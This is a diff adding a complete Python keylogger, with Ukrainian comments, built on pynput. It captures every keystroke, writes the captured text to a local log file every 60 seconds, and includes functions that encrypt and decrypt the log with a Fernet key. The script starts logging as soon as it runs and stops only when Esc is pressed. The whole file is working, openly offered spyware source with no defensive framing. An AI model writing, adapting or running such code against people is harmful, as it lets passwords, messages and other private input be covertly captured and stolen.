@@ -1,0 +1,75 @@
+from pynput import keyboard
+import os
+import time
+import threading
+from cryptography.fernet import Fernet
+
+# Генеруємо ключ для шифрування
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
+# Шлях до файлу для збереження логів
+log_file = "keylog.txt"
+encrypted_log_file = "encrypted_keylog.txt"
+log_data = []
+
+# Функція для запису натискань клавіш
+def on_press(key):
+    global log_data
+    try:
+        log_data.append(str(key.char))
+    except AttributeError:
+        log_data.append(f"[{key}]")
+
+# Функція для зупинки кейлоггера
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+# Функція для збереження логів через певний інтервал часу
+def save_logs():
+    global log_data
+    while True:
+        if log_data:
+            with open(log_file, "a") as f:
+                f.write("".join(log_data))
+            log_data = []
+        time.sleep(60)  # Зберігаємо кожні 60 секунд
+
+# Шифрування логів
+def encrypt_logs():
+    try:
+        with open(log_file, "rb") as f:
+            data = f.read()
+        encrypted_data = cipher_suite.encrypt(data)
+        with open(encrypted_log_file, "wb") as ef:
+            ef.write(encrypted_data)
+        print("Логи зашифровані успішно.")
+    except Exception as e:
+        print(f"Помилка при шифруванні: {e}")
+
+# Запуск фонової функції для збереження логів
+def start_log_saving():
+    save_thread = threading.Thread(target=save_logs, daemon=True)
+    save_thread.start()
+
+# Основна функція для запуску кейлоггера
+def start_keylogger():
+    start_log_saving()
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Функція для дешифрування логів
+def decrypt_logs():
+    try:
+        with open(encrypted_log_file, "rb") as ef:
+            encrypted_data = ef.read()
+        decrypted_data = cipher_suite.decrypt(encrypted_data)
+        with open("decrypted_keylog.txt", "wb") as df:
+            df.write(decrypted_data)
+        print("Логи дешифровані успішно.")
+    except Exception as e:
+        print(f"Помилка при дешифруванні: {e}")
+
+# Запуск кейлоггера
+start_keylogger()
